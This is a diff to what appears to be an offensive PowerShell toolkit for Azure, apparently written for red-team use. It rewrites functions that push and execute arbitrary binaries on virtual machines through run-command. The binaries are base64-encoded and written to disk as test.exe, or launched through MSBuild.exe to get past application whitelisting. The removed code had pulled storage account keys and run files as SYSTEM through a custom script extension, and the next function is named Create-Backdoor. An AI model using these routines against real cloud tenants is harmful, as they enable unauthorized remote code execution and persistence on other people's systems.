@@ -1718,6 +1718,59 @@ function Execute-Command
     }
 }
 
+function Execute-Program
+{
+ <#
+.SYNOPSIS
+    Will run a given binary on a specified VM
+
+.PARAMETER
+    -ResourceGroup (Resource group it's located in)
+    -File (Provide full path)
+    -VM (Name of VM to run file on. Obviously must be Windows with .net installed)
+
+.EXAMPLE
+    Execute-Program -ResourceGroup TestRG -VM AzureWin10 -File C:\path\to\.exe
+#>
+        [CmdletBinding()]
+         Param(
+        [Parameter(Mandatory=$false)][String]$File = $null,
+        [Parameter(Mandatory=$false)][String]$VM = $null,
+        [Parameter(Mandatory=$false)][String]$ResourceGroup = $null)
+
+     if($ResourceGroup -eq "")
+     {
+        Write-Host "Requires Resource Group name" -ForegroundColor Red
+        Write-Host "Usage: Execute-Program -ResourceGroup TestRG -VM AzureWin10 -File C:\path\to\calc.exe" -ForegroundColor Red
+     }
+     elseif($File -eq "")
+     {
+        Write-Host "Requires a File" -ForegroundColor Red
+        Write-Host "Usage: Execute-Program -ResourceGroup TestRG -VM AzureWin10 -File C:\path\to\calc.exe" -ForegroundColor Red
+     }
+     elseif($VM -eq "")
+     {
+        Write-Host "Requires VM name" -ForegroundColor Red
+        Write-Host "Usage: Execute-Program -ResourceGroup TestRG -VM AzureWin10 -File C:\path\to\calc.exe" -ForegroundColor Red
+     }
+     else
+     {    
+            $OS = az vm list --query "[?name=='$VM'].{os:storageProfile.osDisk.osType}" -o tsv
+            if($OS -contains "Linux")
+            {
+                az vm run-command invoke -g $ResourceGroup -n $VM --command-id RunShellScripts --scripts @$File
+            }
+            elseif($OS -contains "Windows")
+            {
+                $ByteArray = [System.IO.File]::ReadAllBytes($File)
+                $Base64String = [System.Convert]::ToBase64String($ByteArray) | Out-File temp.ps1 #This is necessary because raw output is too long for a command to be passed over az vm run-command invoke, so it must be in a script.
+                az vm run-command invoke -g $ResourceGroup -n $VM --command-id RunPowerShellScript --scripts "@temp.ps1" | Out-Null
+                $command = '$path = gci | sort LastWriteTime | select -last 2; $name=$path.Name[0]; $data = Get-Content C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.3\Downloads\$name ;$Decode = [System.Convert]::FromBase64String($data);[System.IO.File]::WriteAllBytes(""test.exe"",$Decode);C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.3\Downloads\test.exe'
+                az vm run-command invoke -g $ResourceGroup -n $VM --command-id RunPowerShellScript --scripts "$command"
+            }
+    }
+}
+
 function Execute-MSBuild
 {
  <#
@@ -1755,80 +1808,9 @@ function Execute-MSBuild
      }
      else
      {
-                $result = az vm run-command invoke -g $ResourceGroup -n $VM --command-id RunPowerShellScript -o yaml --scripts @$File
-                $regex = $result -match '\d\d+(?=\.\w+)'
-                $split = $regex.Split("\\,:")
-                $name = $split[2]
-                $path = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.3\Downloads\$name"
-                $results = az vm run-command invoke -g $ResourceGroup -n $VM --command-id RunPowerShellScript -o yaml --scripts "Start-Process $path"
-                if($results -match "Provisioning succeeded")
-                {
-                    Write-Host "MSBuild launched successfully, hopefully the payload is good!"
-                }
-                else
-                {
-                    $results
-                }  
-      }    
-
-}
-
-function Execute-Program
-{
- <#
-.SYNOPSIS
-    Will run a supplied program of any extension on a specified VM. Requires Contributor Role. Will run as SYSTEM.
-
-.PARAMETER
-    -ResourceGroup (Resource group it's located in)
-    -File (File/program name or path to it. If in current directory do NOT use .\ )
-    -VM (Name of VM to run file on. Obviously must be Windows with .NET installed)
-
-.EXAMPLE
-    Execute-Program -ResourceGroup TestRG -VM AzureWin10 -File fun.exe
-#>
-        [CmdletBinding()]
-         Param(
-        [Parameter(Mandatory=$false)][String]$File = $null,
-        [Parameter(Mandatory=$false)][String]$VM = $null,
-        [Parameter(Mandatory=$false)][String]$ResourceGroup = $null)
-     if($ResourceGroup -eq "")
-     {
-        Write-Host "Requires Resource Group name" -ForegroundColor Red
-        Write-Host "Usage: Execute-Program -ResourceGroup TestRG -VM AzureWin10 -File fun.exe" -ForegroundColor Red
+        az vm run-command invoke -g $ResourceGroup -n $VM --command-id RunPowerShellScript -o yaml --scripts @$File | Out-Null
+        az vm run-command invoke -g $ResourceGroup -n $VM --command-id RunPowerShellScript -o yaml --scripts "$path = gci | sort LastWriteTime | select -last 2; $name=$path.Name[0]; Start-Process C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.3\Downloads\$name"
      }
-     elseif($VM -eq "")
-     {
-        Write-Host "Requires VM name" -ForegroundColor Red
-        Write-Host "Usage: Execute-Program -ResourceGroup TestRG -VM AzureWin10 -File fun.exe" -ForegroundColor Red
-     }
-     elseif($File -eq "")
-     {
-        Write-Host "Requires a file. Do not use .\ for same-directory files." -ForegroundColor Red
-        Write-Host "Usage: Execute-Program -ResourceGroup TestRG -VM AzureWin10 -File fun.exe" -ForegroundColor Red
-     }
-     else
-     {
-    
-            $StorageAccounts = az storage account list --query '[].{Name:name}' -o tsv
-            $StorageAccount = $StorageAccounts[0]
-            $Keys = az storage account keys list -g Test_RG -n $StorageAccount --query '[].{v:value}' -o tsv
-            $Key = $Keys[0]
-            $Containers = az storage container list --account-name $StorageAccount --account-key $Key --query '[].{n:name}' -o tsv
-            $Container = $Containers[0]
-            $Location = az vm list --query "[?name=='$VM'].{l:location}" -o tsv
-            $ErrorActionPreference = "silentlyContinue"
-            Write-Host "Uploading file.Ignore the warning that follows."
-            Write-Host ""
-            az storage blob upload --container-name $Container -f $File --account-name $StorageAccount -n $File | Out-Null
-            Set-AzVMCustomScriptExtension -VMName $VM -ResourceGroupName $ResourceGroup -FileName $File -Name ScriptTest -StorageAccountName $StorageAccount -ContainerName $Container -Location $Location | Out-Null
-            $results = az vm run-command invoke -g $ResourceGroup -n $VM --command-id RunPowerShellScript --scripts "ls C:\Packages\Plugins\Microsoft.Compute.CustomScriptExtension\1.10.5\Downloads" -o yaml
-            $splitted = $results.Split(" ",[System.StringSplitOptions]::RemoveEmptyEntries)
-            $nums = $splitted -match '(\d+)(?!.)'
-            $num = $nums[-1]
-            $path = "C:\Packages\Plugins\Microsoft.Compute.CustomScriptExtension\1.10.5\Downloads\$num\$File"
-            az vm run-command invoke -g $ResourceGroup -n $VM --command-id RunPowerShellScript -o yaml --scripts "C:\Packages\Plugins\Microsoft.Compute.CustomScriptExtension\1.10.5\Downloads\$num\$File"
-        }
 }
 
 function Create-Backdoor
